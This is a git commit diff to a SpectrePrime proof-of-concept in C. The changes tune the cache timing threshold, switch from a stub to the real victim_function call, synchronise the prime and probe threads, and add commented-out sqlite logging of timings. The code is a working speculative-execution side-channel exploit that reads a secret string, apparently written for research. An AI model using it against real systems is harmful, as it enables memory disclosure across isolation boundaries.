01940eeacc4aa2da152faea39c4deeb2920fc80e
William <wlmnzf@126.com>
2019-01-22 23:41:37 +0800

    update

--- l3_eviction/spectreprime-poc/spectreprime-poc.c
+++ l3_eviction/spectreprime-poc/spectreprime-poc.c
@@ -21,8 +21,33 @@
 #include <errno.h>
 #include <stdint.h>
 #include <string.h>
-
+#include "sqlite3.h"
+#define random(x) (rand()%x)
 #pragma comment (lib, "pthreadVC2.lib")
+
+char* itoa(int value, char* result, int base) {
+		// check that the base if valid
+		if (base < 2 || base > 36) { *result = '\0'; return result; }
+ 
+		char* ptr = result, *ptr1 = result, tmp_char;
+		int tmp_value;
+ 
+		do {
+			tmp_value = value;
+			value /= base;
+			*ptr++ = "zyxwvutsrqponmlkjihgfedcba9876543210123456789abcdefghijklmnopqrstuvwxyz" [35 + (tmp_value - value * base)];
+		} while ( value );
+ 
+		// Apply negative sign
+		if (tmp_value < 0) *ptr++ = '-';
+		*ptr-- = '\0';
+		while(ptr1 < ptr) {
+			tmp_char = *ptr;
+			*ptr--= *ptr1;
+			*ptr1++ = tmp_char;
+		}
+		return result;
+}
 
 struct pp_arg_struct {
 	int junk;
@@ -56,6 +81,10 @@ uint8_t unused2[64];
 uint8_t array2[256 * 512];
 uint8_t timeTT[256];
 volatile int flag = 0;
+volatile int flag_T = 0;
+sqlite3 *db=NULL;
+char *zErrMsg =NULL;
+char sql[1000] ;
 
 char *secret = "The Magic Words are Squeamish Ossifrage.";
 
@@ -64,14 +93,16 @@ uint8_t temp = 0; /* Used so compiler wonat optimize out victim_function() */
 void victim_function(size_t x) {
 	if (x < array1_size) {
 		//__asm__("lfence"); or __asm__("mfence"); /* both break Spectre & SpectrePrime in our experiments*/
+		// int rv;
 		array2[array1[x] * 512] = 1;
+		// temp &= array2[array1[x] * 512];
 	}
 }
 
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_MISS_THRESHOLD (60) /* assume cache miss if time >= threshold */
+#define CACHE_MISS_THRESHOLD (70) /* assume cache miss if time >= threshold */
 
 int prime() {
 	int i, junk = 0;
@@ -88,6 +119,7 @@ void test(size_t malicious_x, int tries) {
 
 // array2[82 * 512]=1;
 
+
 	for (j = 29; j >= 0; j--) {
 		 _mm_clflush(&array1_size);
 		volatile int z = 0;
@@ -100,8 +132,11 @@ void test(size_t malicious_x, int tries) {
 		x = training_x ^ (x & (malicious_x ^ training_x));
 
 		/* Call the victim! */
-		// victim_function(x);
-		 array2[82 * 512]=1;
+		// prime();
+		victim_function(x);
+		
+		//  array2[84 * 512]=1;
+		//  array2[82* 512]=1;
 	}
 }
 
@@ -115,17 +150,44 @@ void probe(int junk, int tries, int results[256]) {
 		time1 = __rdtscp(&junk); /* READ TIMER */
 		junk = *addr; /* MEMORY ACCESS TO TIME */
 		time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-		if (time2 >= CACHE_MISS_THRESHOLD && mix_i != array1[tries % array1_size])
+
+		if (time2 >= CACHE_MISS_THRESHOLD)// &&(mix_i != array1[tries % array1_size]||mix_i==84))
 		{
+
 			results[mix_i]++; /* cache hit - add +1 to score for this value */
 			timeTT[mix_i]=time2;
 		}
 	
 	}
-   for(int x=0;x<256;x++)
-   {
-	   printf("index:%d time%d\n",x,timeTT[x]);
-   }
+
+    for(int z=0;z<256;z++)
+	{
+		printf("%d\t%d\n",z,timeTT[z]);
+	}
+// 	char xx[33];
+//    for(int x=0;x<256;x++)
+//    {
+// 	//    printf("index:%d time%d\n",x,timeTT[x]);
+// 	   if(tries==0)
+// 	   {
+// 		    //   strcpy(sql,"INSERT INTO 'time' VALUES(NULL,");
+// 			//   strcat(sql,itoa(x,xx,10));
+// 			//   strcat(sql,",");
+// 			//   strcat(sql,itoa(timeTT[x],xx,10));
+// 			//   strcat(sql,")");
+// 	   }
+// 	   else
+// 	   {
+// 		   	//  strcpy(sql,"update 'time' set time");
+// 			//  strcat(sql,itoa(x,xx,10));
+// 			//  strcat(sql,"=");
+// 			//  strcat(sql,itoa(timeTT[x],xx,10));
+// 			//  strcat(sql," where index=");
+// 			//  strcat(sql,itoa(x,xx,10));
+// 	   }
+//     //   sqlite3_exec(db,sql,NULL,NULL,&zErrMsg);
+
+//    }
 }
 
 void *primeProbe(void *arguments) { //int junk, int tries, int results[256]) {
@@ -142,7 +204,10 @@ void *primeProbe(void *arguments) { //int junk, int tries, int results[256]) {
 	int tries = args->tries;
 	int *results = args->results;
 
+//    for(int z=0;z<10;z++)
 	prime();
+	flag_T=1;
+	// prime();
 	while (flag != 1) {}
 	flag = 0;
 	probe(junk, tries, results);
@@ -162,8 +227,13 @@ void *primeTest(void *arguments) { //size_t malicious_x, int tries) {
 	size_t malicious_x = args->malicious_x;
 	int tries = args->tries;
 
+// for(int z=0;z<10;z++)
+	// prime();
 
-	prime();
+	// prime();
+	//for(int z=0;z<10;z++)
+	while (flag_T != 1) {}
+	flag_T = 0;
 	test(malicious_x, tries);
 	// array2[82 * 512]=1;
 	flag = 1;
@@ -185,10 +255,12 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
 
-	for (tries = 999; tries > 0; tries--) {
+	for (tries = 20; tries > 0; tries--) {
 		pp_args.tries = tries;
 		pt_args.tries = tries;
-		
+	
+	flag=0;
+	flag_T=0;
 	if(pthread_create(&pp_thread,NULL,primeProbe,&pp_args)!=0)
 		{
 			perror("pthread_create");
@@ -216,12 +288,16 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 		}
 		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
 			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+
+		printf("XXXXX %d\n",j);
 	}
 	results[0] ^= junk; /* use junk so code above wonat get optimized out*/
 	value[0] = (uint8_t)j;
 	score[0] = results[j];
 	value[1] = (uint8_t)k;
 	score[1] = results[k];
+
+	printf("%d\n",results[84]);
 }
 
 int main(int argc, const char **argv) {
@@ -238,6 +314,12 @@ int main(int argc, const char **argv) {
 		sscanf(argv[2], "%d", &len);
 	}
 	
+
+
+//   len = sqlite3_open("time.db",&db);
+
+
+
 	printf("Reading %d bytes:\n", len);
 	while (--len >= 0) {
 		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
@@ -252,6 +334,7 @@ int main(int argc, const char **argv) {
 		printf("\n");
 		return 0;
 	}
+	// sqlite3_close(db);
 	// getchar();
 	return (0);
 }
